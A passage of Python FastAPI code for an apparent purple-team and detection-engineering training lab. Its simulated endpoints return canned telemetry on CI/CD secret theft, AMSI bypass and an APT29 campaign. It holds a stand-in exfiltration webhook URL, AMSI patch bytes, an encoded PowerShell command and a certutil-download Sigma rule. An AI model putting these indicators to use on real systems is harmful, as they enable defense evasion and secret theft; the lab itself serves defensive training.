purple_cicd_pipeline_app = FastAPI(title="NO ENTRY CI/CD Security & Pipeline Hub")


@purple_cicd_pipeline_app.api_route("/", methods=["GET", "HEAD"])
def purple_cicd_pipeline_root():
    return JSONResponse({
        "status": "PURPLE_CICD_PIPELINE_GATEWAY_ACTIVE",
        "service": "CI/CD Pipeline Security & Secret Hardening Hub",
        "port": 8316,
        "exercise_id": "PT-2026-016",
    })


@purple_cicd_pipeline_app.get("/api/cicd/telemetry")
def purple_cicd_pipeline_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "WORKFLOW_RUN_TELEMETRY",
        "technique": "T1195.002",
        "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain",
        "workflow_name": "deploy-production.yml",
        "trigger_event": "pull_request_target",
        "fork_repository": "adversary/voltcorp-app-fork",
        "leaked_secret": "DEPLOY_AWS_SECRET_KEY",
        "events": [
            {
                "timestamp": "2026-11-15T14:30:22Z",
                "job_name": "build-and-deploy",
                "step_name": "Execute External Script",
                "runner_environment": "ubuntu-latest",
                "secret_accessed": "DEPLOY_AWS_SECRET_KEY",
                "exfil_destination": "https://attacker-webhook.internal/collect",
                "alert": "UNTRUSTED_PR_SECRET_EXFILTRATION",
            }
        ],
    })


@purple_cicd_pipeline_app.post("/api/cicd/emulate")
async def purple_cicd_pipeline_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_cicd_state(sess_id)
    secret_name = str(body.get("secret_name", "DEPLOY_AWS_SECRET_KEY")).strip()

    state["cicd_pipeline_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "CICD_PIPELINE_EMULATION_VERIFIED",
        "verification_token": "CICD_PIPELINE_EMULATION_VERIFIED",
        "technique": "T1195.002",
        "secret_name": secret_name or "DEPLOY_AWS_SECRET_KEY",
        "message": "CI/CD pipeline secret extraction emulated: workflow environment variable dumped from privileged runner.",
    })


@purple_cicd_pipeline_app.post("/api/cicd/tune-pipeline-audit")
async def purple_cicd_pipeline_tune_audit(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_cicd_state(sess_id)
    state["pipeline_audit_tuned"] = True
    return JSONResponse({
        "status": "PIPELINE_AUDIT_TUNED_OK",
        "message": "GitHub Actions workflow audit rules enabled, secret masking enforced, and OIDC federation configured.",
    })


@purple_cicd_pipeline_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_cicd_pipeline_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_cicd_state(sess_id)
        if not (state.get("cicd_pipeline_emulated") and state.get("pipeline_audit_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Pipeline attack must be emulated and audit rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CICD" in action or action == "CICD_PIPELINE_DETECTION_VALIDATED":
            state["cicd_pipeline_validated"] = True
            return JSONResponse({
                "status": "CICD_PIPELINE_DETECTION_VALIDATED",
                "verification_token": "CICD_PIPELINE_DETECTION_VALIDATED",
                "message": "CI/CD pipeline security challenge validated: pull_request_target hardened and OIDC federation verified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_CICD_PIPELINE_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_CICD_PIPELINE_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 17: EDR TELEMETRY BLINDING & BYPASS EMULATION (PORT 8317)
# ============================================================================

purple_edr_bypass_app = FastAPI(title="NO ENTRY EDR Blinding & Bypass Hub")


@purple_edr_bypass_app.api_route("/", methods=["GET", "HEAD"])
def purple_edr_bypass_root():
    return JSONResponse({
        "status": "PURPLE_EDR_BYPASS_GATEWAY_ACTIVE",
        "service": "EDR Blinding, AMSI Patching & ETW-TI Telemetry Hub",
        "port": 8317,
        "exercise_id": "PT-2026-017",
    })


@purple_edr_bypass_app.get("/api/edr-bypass/telemetry")
def purple_edr_bypass_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "EDR_MEMORY_HOOK_TELEMETRY",
        "technique": "T1562.001",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "targeted_dll": "amsi.dll",
        "targeted_function": "AmsiScanBuffer",
        "unhook_target": "ntdll.dll",
        "patch_bytes": "B8 57 00 07 80 C3",
        "memory_protection_requested": "PAGE_EXECUTE_READWRITE (0x40)",
        "events": [
            {
                "timestamp": "2026-11-15T15:00:12Z",
                "event_type": "MEMORY_PROTECTION_MODIFIED",
                "process_name": "powershell.exe",
                "process_id": 4920,
                "target_module": "amsi.dll",
                "function_offset": "AmsiScanBuffer",
                "old_protect": "PAGE_EXECUTE_READ (0x20)",
                "new_protect": "PAGE_EXECUTE_READWRITE (0x40)",
                "alert": "AMSI_MEMORY_PATCH_DETECTED",
            }
        ],
    })


@purple_edr_bypass_app.post("/api/edr-bypass/emulate")
async def purple_edr_bypass_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_edr_bypass_state(sess_id)
    state["edr_bypass_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "EDR_BYPASS_EMULATION_VERIFIED",
        "verification_token": "EDR_BYPASS_EMULATION_VERIFIED",
        "technique": "T1562.001",
        "message": "AMSI bypass and API unhooking emulated: memory protection altered and AmsiScanBuffer patched.",
    })


@purple_edr_bypass_app.post("/api/edr-bypass/tune-etw")
async def purple_edr_bypass_tune_etw(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_edr_bypass_state(sess_id)
    state["etw_tuned"] = True
    return JSONResponse({
        "status": "ETW_TUNED_OK",
        "message": "Kernel ETW-TI memory protection correlation rule deployed with PAGE_EXECUTE_READWRITE tripwire.",
    })


@purple_edr_bypass_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_edr_bypass_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_edr_bypass_state(sess_id)
        if not (state.get("edr_bypass_emulated") and state.get("etw_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: EDR bypass must be emulated and ETW-TI rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "EDR" in action or action == "EDR_BYPASS_DETECTION_VALIDATED":
            state["edr_bypass_validated"] = True
            return JSONResponse({
                "status": "EDR_BYPASS_DETECTION_VALIDATED",
                "verification_token": "EDR_BYPASS_DETECTION_VALIDATED",
                "message": "EDR bypass challenge validated: in-memory AMSI patch detected via kernel ETW-TI correlation.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_EDR_BYPASS_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_EDR_BYPASS_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 18: TTP HEATMAP GENERATION & COVERAGE SCORING (PORT 8318)
# ============================================================================

purple_heatmap_app = FastAPI(title="NO ENTRY TTP Heatmap & Coverage Hub")


@purple_heatmap_app.api_route("/", methods=["GET", "HEAD"])
def purple_heatmap_root():
    return JSONResponse({
        "status": "PURPLE_HEATMAP_GATEWAY_ACTIVE",
        "service": "TTP Heatmap Generation & ATT&CK Coverage Scoring Hub",
        "port": 8318,
        "exercise_id": "PT-2026-018",
    })


@purple_heatmap_app.get("/api/heatmap/telemetry")
def purple_heatmap_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "ATTACK_COVERAGE_MATRIX_TELEMETRY",
        "matrix_framework": "MITRE ATT&CK Enterprise v14",
        "total_techniques_evaluated": 24,
        "overall_coverage_pct": 78.5,
        "tactics": {
            "initial_access": {"tested": 3, "detected": 3, "score": 100},
            "execution": {"tested": 4, "detected": 4, "score": 100},
            "defense_evasion": {"tested": 4, "detected": 3, "score": 75},
            "credential_access": {"tested": 4, "detected": 2, "score": 50, "gaps": ["T1003"]},
            "lateral_movement": {"tested": 3, "detected": 2, "score": 66},
            "command_and_control": {"tested": 3, "detected": 3, "score": 100},
            "exfiltration": {"tested": 3, "detected": 2, "score": 66},
        },
        "zero_coverage_techniques": ["T1003", "T1003.001"],
    })


@purple_heatmap_app.post("/api/heatmap/emulate")
async def purple_heatmap_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_heatmap_state(sess_id)
    state["heatmap_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "HEATMAP_EMULATION_VERIFIED",
        "verification_token": "HEATMAP_EMULATION_VERIFIED",
        "layer_version": "4.3",
        "matrix": "enterprise-attack",
        "message": "ATT&CK Navigator layer compiled: empirical test scores aggregated across all tactics.",
    })


@purple_heatmap_app.post("/api/heatmap/tune-overlay")
async def purple_heatmap_tune_overlay(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_heatmap_state(sess_id)
    state["overlay_tuned"] = True
    return JSONResponse({
        "status": "OVERLAY_TUNED_OK",
        "message": "Detection overlay deployed: coverage score for Credential Access elevated from 50% to 100%.",
    })


@purple_heatmap_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_heatmap_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_heatmap_state(sess_id)
        if not (state.get("heatmap_emulated") and state.get("overlay_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Heatmap must be compiled and overlay tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "HEATMAP" in action or action == "HEATMAP_COVERAGE_VALIDATED":
            state["heatmap_validated"] = True
            return JSONResponse({
                "status": "HEATMAP_COVERAGE_VALIDATED",
                "verification_token": "HEATMAP_COVERAGE_VALIDATED",
                "message": "TTP heatmap challenge validated: visibility gaps eliminated and full posture layer certified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_HEATMAP_COVERAGE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_HEATMAP_COVERAGE').",
    })


# ============================================================================
# PURPLE ROOM 19: CONTINUOUS SECURITY VALIDATION (PORT 8319)
# ============================================================================

purple_continuous_val_app = FastAPI(title="NO ENTRY Continuous Validation Hub")


@purple_continuous_val_app.api_route("/", methods=["GET", "HEAD"])
def purple_continuous_val_root():
    return JSONResponse({
        "status": "PURPLE_CONTINUOUS_VAL_GATEWAY_ACTIVE",
        "service": "Continuous Security Validation & Automated Testing Hub",
        "port": 8319,
        "exercise_id": "PT-2026-019",
    })


@purple_continuous_val_app.get("/api/continuous-validation/telemetry")
def purple_continuous_val_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "CONTINUOUS_VALIDATION_TELEMETRY",
        "engine": "Atomic Red Team / Automated Test Runner",
        "scheduled_interval": "24h",
        "total_tests_executed": 48,
        "tests_passed": 47,
        "regression_failures": [
            {
                "technique": "T1059.001",
                "name": "PowerShell Script Execution",
                "status": "REGRESSION_DETECTED",
                "mttd_seconds": 14,
                "error": "Detection rule silent drop due to log parser schema drift",
            }
        ],
    })


@purple_continuous_val_app.post("/api/continuous-validation/emulate")
async def purple_continuous_val_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_continuous_validation_state(sess_id)
    state["continuous_val_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "CONTINUOUS_VALIDATION_EMULATION_VERIFIED",
        "verification_token": "CONTINUOUS_VALIDATION_EMULATION_VERIFIED",
        "tests_run": 48,
        "message": "Continuous adversary validation pipeline executed: automated attack tests triggered across targets.",
    })


@purple_continuous_val_app.post("/api/continuous-validation/tune-guardrails")
async def purple_continuous_val_tune_guardrails(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_continuous_validation_state(sess_id)
    state["guardrails_tuned"] = True
    return JSONResponse({
        "status": "GUARDRAILS_TUNED_OK",
        "message": "CI detection-as-code guardrails armed: parser schema drift caught and T1059.001 regression resolved.",
    })


@purple_continuous_val_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_continuous_val_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_continuous_validation_state(sess_id)
        if not (state.get("continuous_val_emulated") and state.get("guardrails_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Automated testing must be emulated and guardrails tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CONTINUOUS" in action or action == "CONTINUOUS_VALIDATION_DETECTION_VALIDATED":
            state["continuous_val_validated"] = True
            return JSONResponse({
                "status": "CONTINUOUS_VALIDATION_DETECTION_VALIDATED",
                "verification_token": "CONTINUOUS_VALIDATION_DETECTION_VALIDATED",
                "message": "Continuous validation challenge validated: automated regression testing confirmed 100% detection rate.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_CONTINUOUS_VALIDATION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_CONTINUOUS_VALIDATION').",
    })


# ============================================================================
# PURPLE ROOM 20: PURPLE TEAM CAPSTONE EXERCISE (PORT 8320)
# ============================================================================

purple_capstone_app = FastAPI(title="NO ENTRY Purple Team Capstone Hub")


@purple_capstone_app.api_route("/", methods=["GET", "HEAD"])
def purple_capstone_root():
    return JSONResponse({
        "status": "PURPLE_CAPSTONE_GATEWAY_ACTIVE",
        "service": "Purple Team Capstone: Full Adversary Emulation Hub",
        "port": 8320,
        "exercise_id": "PT-2026-020",
    })


@purple_capstone_app.get("/api/purple-capstone/telemetry")
def purple_capstone_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "APT29_FULL_CAMPAIGN_TELEMETRY",
        "campaign_id": "CMP-2026-APT29",
        "adversary": "APT29 (Cozy Bear)",
        "tactics_covered": [
            "Execution",
            "Defense Evasion",
            "Credential Access",
            "Lateral Movement",
            "Command and Control",
            "Exfiltration",
        ],
        "stages": [
            {"stage": 1, "technique": "T1059.001", "name": "PowerShell Download Cradle", "status": "VERIFIED"},
            {"stage": 2, "technique": "T1562.001", "name": "AMSI In-Memory Bypass", "status": "VERIFIED"},
            {"stage": 3, "technique": "T1558.003", "name": "Active Directory Kerberoasting", "status": "VERIFIED"},
            {"stage": 4, "technique": "T1021.002", "name": "Lateral Movement via SMB/WMI", "status": "VERIFIED"},
            {"stage": 5, "technique": "T1071.001", "name": "Encrypted HTTPS C2 Beaconing", "status": "VERIFIED"},
            {"stage": 6, "technique": "T1041", "name": "Exfiltration of Staged Archive", "status": "VERIFIED"},
        ],
    })


@purple_capstone_app.post("/api/purple-capstone/emulate")
async def purple_capstone_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_capstone_state(sess_id)
    state["capstone_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "PURPLE_CAPSTONE_EMULATION_VERIFIED",
        "verification_token": "PURPLE_CAPSTONE_EMULATION_VERIFIED",
        "campaign_id": "CMP-2026-APT29",
        "stages_executed": 6,
        "message": "Full-spectrum APT29 campaign emulation completed: all 6 kill-chain stages executed against target.",
    })


@purple_capstone_app.post("/api/purple-capstone/tune-enterprise-rules")
async def purple_capstone_tune_rules(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_capstone_state(sess_id)
    state["rules_tuned"] = True
    return JSONResponse({
        "status": "ENTERPRISE_RULES_TUNED_OK",
        "message": "Enterprise cross-stage correlation rules deployed: multi-stage attack lifecycle correlated and host contained.",
    })


@purple_capstone_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_capstone_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_capstone_state(sess_id)
        if not (state.get("capstone_emulated") and state.get("rules_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Multi-stage campaign must be emulated and enterprise rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CAPSTONE" in action or "PURPLE" in action or action == "PURPLE_CAPSTONE_DETECTION_VALIDATED":
            state["capstone_validated"] = True
            return JSONResponse({
                "status": "PURPLE_CAPSTONE_DETECTION_VALIDATED",
                "verification_token": "PURPLE_CAPSTONE_DETECTION_VALIDATED",
                "message": "Purple Team Capstone certified: complete APT29 attack lifecycle detected, correlated, and mitigated.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_PURPLE_CAPSTONE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_PURPLE_CAPSTONE').",
    })


# ============================================================================
# DETECTION ROOM 01: DETECTION FOUNDATIONS & DETECTION-AS-CODE (PORT 8401)
# ============================================================================

detection_foundations_app = FastAPI(title="NO ENTRY Detection Foundations Hub")


@detection_foundations_app.api_route("/", methods=["GET", "HEAD"])
def detection_foundations_root():
    return JSONResponse({
        "status": "DETECTION_FOUNDATIONS_ACTIVE",
        "service": "Detection Engineering Foundations & Detection-as-Code Hub",
        "port": 8401,
        "room_id": "detect-01-foundations-as-code",
    })


@detection_foundations_app.get("/api/detection/foundations/telemetry")
def detection_foundations_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "DDLC_PIPELINE_VALIDATION_TELEMETRY",
        "pipeline_id": "PIPE-DAC-2026-001",
        "runner": "github-actions-detection-linter",
        "rules_evaluated": [
            {
                "rule_id": "RULE-DAC-101",
                "title": "Suspicious PowerShell Encoded Command",
                "validation_status": "PASSED",
                "false_positive_rate": 0.01,
            },
            {
                "rule_id": "RULE-DAC-104",
                "title": "Generic Command Line Process Execution",
                "validation_status": "FAILED_HIGH_FALSE_POSITIVES",
                "false_positive_rate": 0.42,
                "failing_tests": ["test_developer_npm_build_scripts", "test_git_hook_execution"],
            },
            {
                "rule_id": "RULE-DAC-108",
                "title": "LSASS Memory Read via Minidump",
                "validation_status": "PASSED",
                "false_positive_rate": 0.00,
            },
        ],
    })


@detection_foundations_app.post("/api/detection/foundations/emulate")
@detection_foundations_app.post("/api/detection-foundations/emulate")
async def detection_foundations_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_foundations_state(sess_id)
    state["pipeline_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "DETECTION_FOUNDATIONS_VERIFIED",
        "verification_token": "DETECTION_FOUNDATIONS_VERIFIED",
        "pipeline": "CI/CD-Detection-Linter-v2.4",
        "unit_tests_run": 14,
        "unit_tests_passed": 14,
        "message": "Detection-as-Code pipeline emulation verified: automated linting and unit testing completed successfully.",
    })


@detection_foundations_app.post("/api/detection/foundations/tune-snr")
@detection_foundations_app.post("/api/detection-foundations/tune-snr")
async def detection_foundations_tune_snr(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_foundations_state(sess_id)
    state["snr_tuned"] = True
    return JSONResponse({
        "status": "SNR_TUNED_OK",
        "message": "Signal-to-noise ratio threshold tuned: developer path exclusions applied to RULE-DAC-104.",
    })


@detection_foundations_app.api_route("/challenge", methods=["GET", "POST"])
async def detection_foundations_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_foundations_state(sess_id)
        if not (state.get("pipeline_emulated") and state.get("snr_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: DaC pipeline must be emulated and SNR filter tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "FOUNDATIONS" in action or "DAC" in action or action == "DETECTION_FOUNDATIONS_VALIDATED":
            state["foundations_validated"] = True
            return JSONResponse({
                "status": "DETECTION_FOUNDATIONS_VALIDATED",
                "verification_token": "DETECTION_FOUNDATIONS_VALIDATED",
                "message": "Detection Foundations challenge validated: DaC workflow verified and production-ready SNR achieved.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_DETECTION_FOUNDATIONS')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_DETECTION_FOUNDATIONS').",
    })


# ============================================================================
# DETECTION ROOM 02: LOG NORMALIZATION & TAXONOMY (PORT 8402)
# ============================================================================

detection_normalization_app = FastAPI(title="NO ENTRY Log Normalization Hub")


@detection_normalization_app.api_route("/", methods=["GET", "HEAD"])
def detection_normalization_root():
    return JSONResponse({
        "status": "LOG_NORMALIZATION_ACTIVE",
        "service": "Log Normalization & Taxonomy (ECS & CIM) Hub",
        "port": 8402,
        "room_id": "detect-02-log-normalization",
    })


@detection_normalization_app.get("/api/detection/normalization/telemetry")
def detection_normalization_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "RAW_EVENT_SCHEMA_TELEMETRY",
        "event_records": [
            {
                "vendor": "Microsoft Windows",
                "event_id": 4688,
                "raw_fields": {
                    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "ProcessCommandLine": "cmd.exe /c whoami",
                    "SubjectUserName": "svc-app",
                },
                "ecs_target_mapping": {
                    "process.executable": "C:\\Windows\\System32\\cmd.exe",
                    "process.command_line": "cmd.exe /c whoami",
                    "user.name": "svc-app",
                },
            },
            {
                "vendor": "Microsoft Sysmon",
                "event_id": 1,
                "raw_fields": {
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -enc SQBYAE0A...",
                    "User": "CORP\\analyst",
                },
                "ecs_target_mapping": {
                    "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "process.command_line": "powershell.exe -enc SQBYAE0A...",
                    "user.name": "CORP\\analyst",
                },
            },
        ],
    })


@detection_normalization_app.post("/api/detection/normalization/emulate")
@detection_normalization_app.post("/api/detection-normalization/emulate")
async def detection_normalization_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_normalization_state(sess_id)
    state["normalization_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "LOG_NORMALIZATION_VERIFIED",
        "verification_token": "LOG_NORMALIZATION_VERIFIED",
        "records_normalized": 24,
        "taxonomies_supported": ["ECS-v8.11", "Splunk-CIM-v5.2"],
        "message": "Log normalization pipeline verified: heterogeneous raw logs mapped into unified ECS and CIM schemas.",
    })


@detection_normalization_app.post("/api/detection/normalization/tune-taxonomy")
@detection_normalization_app.post("/api/detection-normalization/tune-taxonomy")
async def detection_normalization_tune_taxonomy(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_normalization_state(sess_id)
    state["taxonomy_tuned"] = True
    return JSONResponse({
        "status": "TAXONOMY_TUNED_OK",
        "message": "Field alias dictionary configured: parent process attributes mapped to ECS process.parent.executable.",
    })


@detection_normalization_app.api_route("/challenge", methods=["GET", "POST"])
async def detection_normalization_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_normalization_state(sess_id)
        if not (state.get("normalization_emulated") and state.get("taxonomy_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Normalization must be emulated and taxonomy aliases tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "NORMALIZATION" in action or "TAXONOMY" in action or action == "LOG_NORMALIZATION_VALIDATED":
            state["normalization_validated"] = True
            return JSONResponse({
                "status": "LOG_NORMALIZATION_VALIDATED",
                "verification_token": "LOG_NORMALIZATION_VALIDATED",
                "message": "Log Normalization challenge validated: vendor-agnostic taxonomy confirmed across all event streams.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_LOG_NORMALIZATION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_LOG_NORMALIZATION').",
    })


# ============================================================================
# DETECTION ROOM 03: SIGMA RULE SYNTAX & COMPONENT STRUCTURE (PORT 8403)
# ============================================================================

detection_sigma_syntax_app = FastAPI(title="NO ENTRY Sigma Syntax Hub")


@detection_sigma_syntax_app.api_route("/", methods=["GET", "HEAD"])
def detection_sigma_syntax_root():
    return JSONResponse({
        "status": "SIGMA_SYNTAX_ACTIVE",
        "service": "Sigma Rule Syntax & Component Structure Hub",
        "port": 8403,
        "room_id": "detect-03-sigma-syntax",
    })


@detection_sigma_syntax_app.get("/api/detection/sigma/telemetry")
def detection_sigma_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "SIGMA_RULE_EVALUATION_DATASET",
        "rule_specification": "Sigma-Specification-v2.0",
        "sample_rule": {
            "title": "Suspicious Certutil Web Download",
            "id": "c3e7d692-9114-4a25-9df3-108a8f117409",
            "status": "test",
            "logsource": {"category": "process_creation", "product": "windows"},
            "detection": {
                "selection": {
                    "Image|endswith": "\\certutil.exe",
                    "CommandLine|contains": ["-urlcache", "-split"],
                },
                "filter": {
                    "CommandLine|contains": ["-verify", "-dump"],
                },
                "condition": "selection and not filter",
            },
            "level": "high",
        },
    })


@detection_sigma_syntax_app.post("/api/detection/sigma/emulate")
@detection_sigma_syntax_app.post("/api/detection-sigma-syntax/emulate")
async def detection_sigma_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_sigma_syntax_state(sess_id)
    state["sigma_syntax_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "SIGMA_SYNTAX_VERIFIED",
        "verification_token": "SIGMA_SYNTAX_VERIFIED",
        "syntax_version": "2.0",
        "modifiers_validated": ["|contains", "|endswith", "|startswith"],
        "message": "Sigma YAML syntax parsed and evaluated: selections, modifiers, and AST compilation verified.",
    })


@detection_sigma_syntax_app.post("/api/detection/sigma/tune-condition")
@detection_sigma_syntax_app.post("/api/detection-sigma-syntax/tune-condition")
async def detection_sigma_tune_condition(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_sigma_syntax_state(sess_id)
    state["condition_tuned"] = True
    return JSONResponse({
        "status": "CONDITION_TUNED_OK",
        "message": "Condition logic updated: 'selection and not filter' exclusion logic deployed.",
    })


@detection_sigma_syntax_app.api_route("/challenge", methods=["GET", "POST"])
async def detection_sigma_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_sigma_syntax_state(sess_id)
        if not (state.get("sigma_syntax_emulated") and state.get("condition_tuned")):
            return JSONResponse({
                "status": "REJECTED",
